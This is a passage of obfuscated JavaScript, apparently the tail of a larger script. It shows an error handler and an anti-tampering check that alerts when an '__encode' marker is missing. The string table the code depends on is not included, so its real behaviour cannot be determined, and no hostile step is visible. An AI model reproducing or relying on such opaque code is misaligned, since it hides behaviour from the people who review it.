`${__Oxdede0[0xa]}`}}catch(e){$[__Oxdede0[0xc]](__Oxdede0[0xb],e)}finally{_0x5107x4(data1)}})})}(function(_0x5107x8,_0x5107x9,_0x5107xa,_0x5107xb,_0x5107xc,_0x5107xd){_0x5107xd= __Oxdede0[0xe];_0x5107xb= function(_0x5107xe){if( typeof alert!== _0x5107xd){alert(_0x5107xe)};if( typeof console!== _0x5107xd){console[__Oxdede0[0xf]](_0x5107xe)}};_0x5107xa= function(_0x5107xf,_0x5107x8){return _0x5107xf+ _0x5107x8};_0x5107xc= _0x5107xa(__Oxdede0[0x10],_0x5107xa(_0x5107xa(__Oxdede0[0x11],__Oxdede0[0x12]),__Oxdede0[0x13]));try{_0x5107x8= __encode;if(!( typeof _0x5107x8!== _0x5107xd&& _0x5107x8=== _0x5107xa(__Oxdede0[0x14],__Oxdede0[0x15]))){_0x5107xb(_0x5107xc)}}catch(e){_0x5107xb(_0x5107xc)}})({})
